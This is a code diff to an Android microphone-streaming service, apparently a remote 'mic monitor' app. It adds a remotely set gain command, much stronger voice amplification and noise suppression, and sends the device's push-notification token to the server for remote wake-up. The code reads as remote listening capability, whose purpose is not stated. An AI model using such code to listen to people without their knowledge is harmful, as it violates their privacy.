@@ -129,6 +129,7 @@ class MicService : Service() {
     @Volatile private var isRecoveringMic = false
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "room" // near | room | far
+    @Volatile private var softwareGainMultiplier = 1.0 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
     @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
     @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
@@ -1278,6 +1279,13 @@ class MicService : Service() {
                     Log.i(TAG, "Voice profile set to $voiceProfile (realtime mode, heavy processing)")
                     sendCommandAck("voice_profile", detail = voiceProfile)
                 }
+                "set_gain" -> {
+                    val level = obj.optDouble("level", 1.0).coerceIn(0.5, 5.0)
+                    softwareGainMultiplier = level
+                    Log.i(TAG, "Software gain set to ${level}x")
+                    safeSend("""{"type":"gain_ack","level":$level}""")
+                    sendCommandAck("set_gain", detail = "${level}x")
+                }
                 "streaming_mode" -> {
                     // Switch between realtime (20ms chunks) and HQ buffered (10-sec buffer)
                     val mode = obj.optString("mode", "realtime").trim().lowercase()
@@ -1377,13 +1385,14 @@ class MicService : Service() {
             mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
             mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "false"))
             
-            // Keep NS on for all profiles to reduce constant room noise.
+            // Aggressive noise suppression for clear voice
             mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "false"))
-            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "false"))
-            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", if (isFarMode) "false" else "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "false"))
-            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "false"))
+            mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "true"))
+            // AGC ON for all profiles to maximize volume capture
+            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
             
@@ -2845,13 +2854,13 @@ class MicService : Service() {
             work[i] = ((hi shl 8) or lo).toShort().toDouble()
         }
 
-        // ── Pre-gain mic boost (moderate lift to protect headroom) ─────────────
+        // ── Pre-gain mic boost (aggressive lift for clear loud voice) ─────────
         val micBoost = when (p) {
-            "near" -> 1.85
-            "far" -> 2.25
-            else -> 1.70
+            "near" -> 2.8
+            "far" -> 4.0
+            else -> 2.5
         }
-        for (i in 0 until samples) work[i] *= micBoost
+        for (i in 0 until samples) work[i] *= micBoost * softwareGainMultiplier
 
         // ── Stage 1: High-pass filter @ 120 Hz ───────────────────────────────
         // In noisy environments (fan/hum), push HPF slightly higher to remove rumble.
@@ -2884,14 +2893,14 @@ class MicService : Service() {
         for (v in work) sumSq += v * v
         val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
         val gainCeil = when (p) {
-            "near" -> if (strongAi) 3.2 else 2.8
-            "far" -> if (strongAi) 4.2 else 3.6
-            else -> if (strongAi) 3.0 else 2.6
+            "near" -> if (strongAi) 5.0 else 4.0
+            "far" -> if (strongAi) 7.0 else 5.5
+            else -> if (strongAi) 4.5 else 3.5
         }
         val gainTarget = when (p) {
-            "near" -> if (strongAi) 9000.0 else 8200.0
-            "far" -> if (strongAi) 12000.0 else 10200.0
-            else -> if (strongAi) 8600.0 else 7600.0
+            "near" -> if (strongAi) 14000.0 else 11000.0
+            "far" -> if (strongAi) 18000.0 else 15000.0
+            else -> if (strongAi) 12000.0 else 10000.0
         }
         val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
         // Slow, smooth attack/release for natural dynamics.
@@ -2946,11 +2955,11 @@ class MicService : Service() {
             val abs = kotlin.math.abs(v)
             if (abs > peakAbs) peakAbs = abs
         }
-        val loudnessTarget = 25500.0
+        val loudnessTarget = 29000.0
         val maxNorm = when (p) {
-            "near" -> 2.4
-            "far" -> 2.8
-            else -> 2.2
+            "near" -> 3.2
+            "far" -> 4.0
+            else -> 3.0
         }
         val norm = (loudnessTarget / peakAbs).coerceIn(1.0, maxNorm)
         for (i in 0 until samples) work[i] *= norm
@@ -3652,6 +3661,12 @@ class MicService : Service() {
             put("streamingMode", if (hqBufferedMode) "hq_buffered" else "realtime")
             put("hqBufferSeconds", if (hqBufferedMode) hqBufferSeconds else 0)
             put("hqBufferFill", if (hqBufferedMode) hqBufferOffset else 0)
+            
+            // FCM Token for Layer 4 triggering (remote wake-up)
+            val prefs = getSharedPreferences("micmonitor", MODE_PRIVATE)
+            val fcmToken = prefs.getString("fcm_token", "")
+            put("fcmToken", fcmToken)
+
             // Network quality info
             put("netDownKbps", downKbps)
             put("netUpKbps", upKbps)
